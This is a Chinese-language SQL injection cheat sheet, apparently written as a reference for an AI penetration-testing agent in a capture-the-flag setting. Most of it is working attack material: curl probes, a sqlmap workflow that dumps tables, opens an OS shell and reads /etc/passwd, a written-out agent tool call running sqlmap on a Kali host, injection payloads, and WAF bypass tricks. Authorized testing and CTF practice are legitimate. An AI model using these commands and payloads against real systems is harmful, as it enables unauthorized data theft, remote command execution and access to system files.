# SQL 注入

## 探测

```bash
# 单引号让 500：
curl "http://target/item?id=1'"
# 让逻辑变 false：
curl "http://target/item?id=1 AND 1=2--"
# 时间盲注：
curl "http://target/item?id=1 AND SLEEP(3)--"
```

## sqlmap 标准流程

```bash
# 第一轮：自动探测 + 列库
sqlmap -u "http://target/item?id=1" --batch --random-agent --level=3 --risk=2 -o
# 看到注入点后列库
sqlmap -u "..." --batch --dbs
# 列表
sqlmap -u "..." -D <db> --tables
# 列字段
sqlmap -u "..." -D <db> -T <table> --columns
# 抓数据
sqlmap -u "..." -D <db> -T <table> --dump
# 拿 shell（条件够时）
sqlmap -u "..." --os-shell
# 读文件（有 FILE 权限时）
sqlmap -u "..." --file-read=/etc/passwd
```

## 长任务（bg_run）

完整 sqlmap 跑很慢，必用 `bg_run`，再 `job_tail` 看进度：
```tool
{"name":"bg_run","args":{"command":"sqlmap -u 'http://target/item?id=1' --batch --dbs --output-dir=/tmp/sqlmap","run_on":"kali","tag":"sqlmap"}}
```

## 常见 payload

| 类型 | 触发 |
|---|---|
| union | `' UNION SELECT 1,2,version()--` |
| 报错 | MySQL: `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` |
| 布尔盲 | `' AND substr(version(),1,1)='5'--` |
| 时间盲 | MySQL: `' AND IF(1=1,SLEEP(3),0)--` |
| 二阶 | 注入数据被另一处使用时触发 |
| ORDER BY 列数探测 | `' ORDER BY 1--`，递增到报错 |

## 各库特征

- MySQL: `version()`、`information_schema.tables`、`/*!50000xxx*/` 注释
- PostgreSQL: `pg_database`、`pg_stat_activity`、`::int` 类型转换
- MSSQL: `@@version`、`xp_cmdshell`（能执命令）、报错回显容易
- SQLite: `sqlite_master`、不支持 `INFORMATION_SCHEMA`、`||` 拼字符串
- Oracle: `dual`、`utl_inaddr.get_host_address()` OOB

## 绕过

- 大小写：`SeLeCt`
- 注释绕空格：`/**/UNION/**/SELECT`
- `+` `%20` `%09` `%0a` 替代空格
- `like` 替代 `=`
- 双重 URL 编码
- 截断长度限制：`AND 1=1#`、`-- ` 注释
- WAF 关键字：用 `concat()` 拼或者 `0x` hex

## 字段类型猜测

- 数字注入直接 `id=1 OR 1=1`
- 字符串注入要先猜引号类型 `1'`、`1"`、`1)`、`1'))`
- 列数 `ORDER BY n--` 二分

## 二次验证 flag

数据库里取出的 flag 可能含编码：
- base64 / hex / `from_base64()` / `unhex()`
- MySQL `CONCAT_WS()` 拼时易丢分隔符
